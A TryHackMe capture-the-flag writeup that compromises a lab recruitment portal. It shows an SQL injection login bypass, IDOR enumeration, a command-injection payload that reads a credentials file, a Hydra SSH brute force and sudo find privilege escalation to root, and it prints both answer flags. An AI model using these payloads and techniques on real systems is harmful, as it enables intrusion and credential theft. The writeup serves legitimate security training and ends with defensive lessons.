# Operation Promotion — CTF Writeup

> **Operation Promotion** — One engagement stands between you and your next title.

---

## Table of Contents

- [Challenge Overview](#challenge-overview)
- [Step 1 — Nmap Scan](#step-1--nmap-scan)
- [Step 2 — robots.txt Disclosure & Admin Panel Discovery](#step-2--robotstxt-disclosure--admin-panel-discovery)
- [Step 3 — SQL Injection: Admin Login Bypass](#step-3--sql-injection-admin-login-bypass)
- [Step 4 — User Enumeration via lookup.php (IDOR)](#step-4--user-enumeration-via-lookupphp-idor)
- [Step 5 — Discovering the sysmaint Service Endpoint](#step-5--discovering-the-sysmaint-service-endpoint)
- [Step 6 — OS Command Injection via host Parameter](#step-6--os-command-injection-via-host-parameter)
- [Step 7 — Leaking db.conf — Database Credentials](#step-7--leaking-dbconf--database-credentials)
- [Step 8 — Password Cracking Attempt & Custom Wordlist](#step-8--password-cracking-attempt--custom-wordlist)
- [Step 9 — SSH Brute-Force with Hydra](#step-9--ssh-brute-force-with-hydra)
- [Step 10 — SSH Access as jford & Flag 1](#step-10--ssh-access-as-jford--flag-1)
- [Step 11 — Sudo Privilege Enumeration](#step-11--sudo-privilege-enumeration)
- [Step 12 — GTFOBins: find Privilege Escalation (Explained in Detail)](#step-12--gtfobins-find-privilege-escalation-explained-in-detail)
- [Step 13 — Root Access & Final Flag](#step-13--root-access--final-flag)
- [Flags Summary](#flags-summary)
- [Vulnerability Summary](#vulnerability-summary)
- [Attack Chain](#attack-chain)
- [Key Takeaways](#key-takeaways)

---

## Challenge Overview

| Field       | Details                                                          |
|-------------|---------------------------------------------------------------------|
| Name        | Operation Promotion                                                  |
| Platform    | TryHackMe                                                            |
| Category    | Web (SQLi + IDOR + OS Command Injection) → Linux Privilege Escalation |
| Target IP   | 10.49.173.128                                                        |
| Objective   | Compromise the RecruitCorp careers portal and escalate to root      |

---

## Step 1 — Nmap Scan

Started with a full TCP port scan with version detection and default script scanning.

**Command:**
```bash
nmap -sV -sC -p- -sS 10.49.173.128
```

> **Command Breakdown:**
> - `-sV` — Detects service/version information
> - `-sC` — Runs Nmap's default script scan (NSE)
> - `-p-` — Scans all 65,535 TCP ports
> - `-sS` — SYN ("stealth") scan

**Scan Results:**

| Port    | State | Service       | Version                                |
|---------|-------|---------------|------------------------------------------|
| 22/tcp  | open  | ssh           | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16       |
| 80/tcp  | open  | http          | Apache httpd 2.4.58 (Ubuntu)            |
| 139/tcp | open  | netbios-ssn   | Samba smbd 4.6.2                         |
| 445/tcp | open  | netbios-ssn   | Samba smbd 4.6.2                         |

**Additional Findings:**
```
http-title: RecruitCorp - Careers Portal
http-robots.txt: 1 disallowed entry
  /admin/
NetBIOS name: RECRUITCORP
```

> **Key Observations:**
> - Port 80 hosts a **careers/recruitment portal** named **RecruitCorp**
> - `robots.txt` explicitly discloses a hidden **`/admin/`** path — ironically telling search engines (and attackers) exactly where *not* to look
> - SMB (139/445) is also open — noted for completeness, though it was not required for this attack path

---

## Step 2 — robots.txt Disclosure & Admin Panel Discovery

Nmap's script scan already flagged the disallowed entry in `robots.txt`. Navigated directly to confirm.

**URL:**
```
http://10.49.173.128/admin/
```

> `robots.txt` is meant to tell **search engine crawlers** which paths not to index — it is **not** an access control mechanism. Any path listed here is publicly visible to anyone who simply requests `/robots.txt`, making it a common (if old) reconnaissance trick for locating hidden admin panels.

The request resolved to a login page for the **RecruitCorp Admin Panel**.

---

## Step 3 — SQL Injection: Admin Login Bypass

Tested the admin login form with a classic SQL injection authentication bypass payload.

**Payload used:**
```sql
admin ' -- -
```


This successfully bypassed authentication and granted access to the **Admin Panel** dashboard.

---

## Step 4 — User Enumeration via lookup.php (IDOR)

Inside the admin panel, a user list was visible along with a short note for each account. Each user could be inspected via a `lookup.php` endpoint that accepted a numeric `id` parameter — with **no check** that the request was authorized to view *that specific* user's data.

**Payload tested:**
```
http://10.49.173.128/admin/users/lookup.php?id=7
```

> This is an **Insecure Direct Object Reference (IDOR)** — the application trusts the `id` value supplied directly in the URL without verifying the requester should be allowed to view that record, making it trivial to enumerate every user simply by incrementing the ID.

**Response for ID 7:**

| Field    | Value                                                                |
|----------|-----------------------------------------------------------------------|
| ID       | 7                                                                      |
| Username | `sysmaint`                                                             |
| Role     | `system`                                                               |
| Notes    | Service account for `/admin/sysmaint-checks/ping.php`. Do not disable. |

> 🎯 **Critical lead:** The notes field directly reveals a **previously-unknown internal endpoint** — `/admin/sysmaint-checks/ping.php` — tied to a service account. This is exactly the kind of internal documentation that should never be exposed through a user-facing field.

---

## Step 5 — Discovering the sysmaint Service Endpoint

Navigated directly to the endpoint disclosed in the previous step.

**URL:**
```
http://10.49.173.128/admin/sysmaint-checks/ping.php
```

**Response:**
```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

> The endpoint itself leaks its expected parameter name (`host`) through a usage message — another small information disclosure that confirms exactly how to interact with it.

**Tested with a legitimate value:**
```
http://10.49.173.128/admin/sysmaint-checks/ping.php?host=127.0.0.1
```

**Response:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.025/0.025/0.025/0.000 ms
```

> The output is the **raw result of a `ping` command**, strongly suggesting the backend runs something like `shell_exec("ping -c 1 " . $_GET['host'])` — directly concatenating user input into a shell command. This is a strong indicator of a potential **OS Command Injection** vulnerability.

---

## Step 6 — OS Command Injection via host Parameter

### First attempt (failed)

```
http://10.49.173.128/admin/sysmaint-checks/ping.php?host=127.0.0.1&cat /var/www/html/config/db.conf
```

This **did not work**. Here's why:

> In a URL query string, the **`&`** character is the standard delimiter used to **separate parameters** (e.g. `?a=1&b=2`). When `&cat /var/www/html/config/db.conf` is placed directly after `host=127.0.0.1`, the web server's URL parser treats it as the **start of a brand-new parameter**, not as part of the `host` value. As a result, the `host` parameter only ever receives `127.0.0.1` — our injected command never reaches the backend's shell command at all.

### Working payload (URL-encoded)

```
http://10.49.173.128/admin/sysmaint-checks/ping.php?host=127.0.0.1%26cat+/var/www/html/config/db.conf
```

> **Payload Breakdown:**
> - `%26` — The URL-encoded representation of `&`. Encoding it this way tells the **URL parser** to treat it as a **literal character belonging to the `host` value**, not as a parameter delimiter. The entire string `127.0.0.1&cat /var/www/html/config/db.conf` is now correctly passed as a single value to the `host` parameter.
> - `+` — The URL-encoded representation of a **space character**.
> - Once this full string reaches the backend PHP code and gets concatenated into a shell command (e.g. `ping -c 1 127.0.0.1&cat /var/www/html/config/db.conf`), the **shell** itself interprets the `&` as a command separator — running `ping` first, and then running our injected `cat` command immediately after.

This time, the payload worked — the response included both the ping output **and** the contents of a configuration file.

---

## Step 7 — Leaking db.conf — Database Credentials

**Response from the command injection:**
```ini
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.025 ms
```

> **Hash format breakdown:** `$2b$10$QzkXmGndA2cQLozO3xAN6e...`
> - `$2b$` — Identifies this as a **bcrypt** hash (specifically the `2b` variant of the algorithm)
> - `$10$` — The **cost factor**: the work factor is `2^10` (1,024) rounds, meaning the hash is deliberately slow to compute — by design, to resist brute-force/cracking attempts
> - The remaining characters encode the **salt** and the **hash digest** together
>
> 🔑 **Credentials Found:**
> - **Username:** `jford`
> - **Password (hash):** bcrypt hash (above) — not yet cracked
>
> The comment `# Pulled out of source control - DO NOT COMMIT.` is a strong real-world signal: this file was likely accidentally committed to version control at some point, then "fixed" by deleting it from the repo without rotating the actual credentials.

---

## Step 8 — Password Cracking Attempt & Custom Wordlist

Attempted to crack the bcrypt hash offline using a standard wordlist (e.g. `rockyou.txt`) for roughly 30–40 minutes — **without success**.

> **Why this is expected:** Unlike fast hashing algorithms (MD5, SHA1), **bcrypt is intentionally slow** — that's the entire point of the algorithm. With a cost factor of `10`, each guess requires 1,024 rounds of hashing, making brute-force attempts against large wordlists impractically slow on standard hardware.

Rather than continuing to brute-force the hash offline, pivoted to building a **small, targeted wordlist** based on a contextual clue ("Spring 2026") observed while enumerating the careers portal.

**Wordlist created:** `wordlis.txt`
```
spring2026!
Spring2026!
spring2026@123
Spring2026@123
```

> Targeted wordlists built from real context (company branding, seasonal references, hiring cycles, etc.) are often far more effective than generic wordlists — especially against a small set of candidate passwords that can be tested **online** instead of cracked **offline**.

---

## Step 9 — SSH Brute-Force with Hydra

Used the custom wordlist to attempt an online password brute-force against SSH for the `jford` account discovered earlier.

**Command:**
```bash
hydra -l jford -P wordlis.txt 10.49.173.128 ssh
```

> **Command Breakdown:**
> - `-l jford` — Specifies a **single** username to test (`jford`)
> - `-P wordlis.txt` — Specifies the **password list** file to try against that username
> - `10.49.173.128` — Target host
> - `ssh` — The service/protocol to attack

**Result:**
```
[22][ssh] host: 10.49.173.128   login: jford   password: spring2026!
1 of 1 target successfully completed, 1 valid password found
```

> 🔑 **Valid SSH credentials confirmed:**
> - **Username:** `jford`
> - **Password:** `spring2026!`

---

## Step 10 — SSH Access as jford & Flag 1

Logged into the target over SSH using the cracked credentials.

**Command:**
```bash
ssh jford@10.49.173.128
```

**Commands once authenticated:**
```bash
ls
cat user.txt
```

**Output:**
```
user.txt

THM{bdbee0a91ebcb0b0fafde931223efe09}
```

> 🚩 **Flag 1:** `THM{bdbee0a91ebcb0b0fafde931223efe09}`

---

## Step 11 — Sudo Privilege Enumeration

Checked what commands the `jford` user is permitted to run with elevated privileges.

**Command:**
```bash
sudo -l
```

**Output:**
```
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

> 🎯 **Critical Finding:** `jford` can run **`/usr/bin/find`** as **root**, with **no password required** (`NOPASSWD`).
>
> The `find` command has a built-in `-exec` feature that allows it to **run arbitrary commands** on the files it locates. Since `find` itself is being launched as root via `sudo`, any command it executes through `-exec` will **also run as root**. This is a well-documented privilege escalation technique (cataloged on [GTFOBins](https://gtfobins.github.io/gtfobins/find/)).

---

## Step 12 — GTFOBins: find Privilege Escalation (Explained in Detail)

**Command:**
```bash
sudo find / -exec /bin/bash \; -quit
```

> **Command Breakdown, piece by piece:**
> - `sudo` — Runs the following command with elevated privileges, as permitted by the `NOPASSWD` rule found above
> - `find /` — Starts a file search beginning at the root directory (`/`). This is simply the standard way to invoke `find`; the search itself isn't the point — it's a vehicle for the `-exec` flag.
> - `-exec /bin/bash \;` — For **each file found**, `find` would normally run the specified command on it. Here, we tell it to execute `/bin/bash` instead. Because the entire `find` process is running as **root** (via `sudo`), the spawned `/bin/bash` process **inherits root's privileges**.
>   - The `\;` is a **escaped semicolon**, required by `find`'s syntax to mark the end of the `-exec` command list. It must be escaped (`\;`) so the shell doesn't interpret the semicolon itself as a command separator before `find` ever sees it.
> - `-quit` — Tells `find` to **stop searching immediately** after the first match. Without this, `find` would try to spawn a **new** `/bin/bash` shell for **every single file** on the entire filesystem — `-quit` ensures we get exactly **one** shell, right away.

**Result:**
```bash
whoami
```
```
root
```

> ✅ **Root shell obtained** — by abusing the unrestricted `NOPASSWD` sudo rule on `/usr/bin/find`.

---

## Step 13 — Root Access & Final Flag

With root access confirmed, navigated to `/root` to retrieve the final flag.

**Commands:**
```bash
ls
cd root
ls
cat flag.txt
```

**Output:**
```
bin   core  home  ...  root  ...

flag.txt  snap

THM{d999a1f6319a9c5b48c067dfab314ba2}
```

> 🚩 **Final Flag (root):** `THM{d999a1f6319a9c5b48c067dfab314ba2}`

---

## Flags Summary

| # | Flag                                       | User Context | Method                                            |
|---|---------------------------------------------|---------------|-----------------------------------------------------|
| 1 | `THM{bdbee0a91ebcb0b0fafde931223efe09}`     | jford         | SQLi → IDOR → command injection → targeted brute-force |
| 2 | `THM{d999a1f6319a9c5b48c067dfab314ba2}`     | root          | GTFOBins privilege escalation via `sudo find`       |

---

## Vulnerability Summary

| # | Vulnerability                            | Location                                  | Impact                                          |
|---|--------------------------------------------|---------------------------------------------|----------------------------------------------------|
| 1 | Sensitive path disclosed via robots.txt    | `/robots.txt`                               | Revealed hidden `/admin/` panel                    |
| 2 | SQL Injection (authentication bypass)      | `/admin/` login form                        | Bypassed login without valid credentials           |
| 3 | Insecure Direct Object Reference (IDOR)    | `/admin/users/lookup.php?id=`               | Enumerated all user accounts and internal notes    |
| 4 | Sensitive internal info in user notes      | User record for `sysmaint`                  | Disclosed an undocumented internal endpoint        |
| 5 | Verbose usage/error message                | `/admin/sysmaint-checks/ping.php`           | Revealed required parameter name                   |
| 6 | OS Command Injection                       | `ping.php?host=`                            | Arbitrary command execution, leaked config file     |
| 7 | Hardcoded database credentials in config   | `/var/www/html/config/db.conf`              | Leaked application DB username and password hash   |
| 8 | Weak/guessable password policy             | SSH account `jford`                         | Cracked via small, context-based wordlist          |
| 9 | Overly permissive sudo rule (NOPASSWD)     | `/usr/bin/find`                             | Full privilege escalation to root                  |

---

## Attack Chain

```
Nmap → Port 80 (Apache) → robots.txt → /admin/ discovered
→ SQLi (' OR 1=1 --) → Admin panel access
→ lookup.php?id=7 (IDOR) → sysmaint notes → ping.php endpoint revealed
→ ping.php?host=127.0.0.1 → confirms shell command execution
→ %26 (encoded &) → OS Command Injection
→ cat db.conf → leaked jford + bcrypt hash
→ Offline cracking fails (bcrypt is slow) → pivot to targeted wordlist
→ Hydra SSH brute-force → jford : spring2026!
→ SSH login → Flag 1
→ sudo -l → NOPASSWD on /usr/bin/find
→ sudo find / -exec /bin/bash \; -quit → root shell
→ /root/flag.txt → Flag 2
```

---

## Key Takeaways

- **`robots.txt` is not access control** — never rely on it to hide sensitive paths; it actively advertises them to anyone who checks
- **Always use parameterised queries** — string-concatenated SQL makes authentication bypass trivial with payloads as simple as `' OR 1=1 --`
- **Every object reference (IDs, usernames, file paths) must be authorization-checked server-side** — IDOR vulnerabilities let attackers enumerate data they were never meant to see
- **Internal notes/comments fields are not a safe place for operational details** — the `sysmaint` note directly handed over a hidden endpoint
- **Never pass user input directly into a shell command** — even a single unencoded `&` was the only thing standing between "just a ping tool" and full OS Command Injection
- **Don't hardcode credentials in config files**, and never assume deleting a file from version control "undoes" a leak — the file's history (and the leaked secret) may still be reachable
- **Bcrypt resists brute-force by design** — but a slow hash doesn't help if the password itself is weak or guessable from public context (e.g., seasonal/company branding)
- **Audit every `sudo` rule carefully** — `NOPASSWD` access to powerful binaries like `find`, `vim`, `less`, `awk`, etc. is a direct path to root (see [GTFOBins](https://gtfobins.github.io/) for the full list of abusable binaries)

---

*Writeup by: [showrya] | Platform: TryHackMe | Room: Operation Promotion*
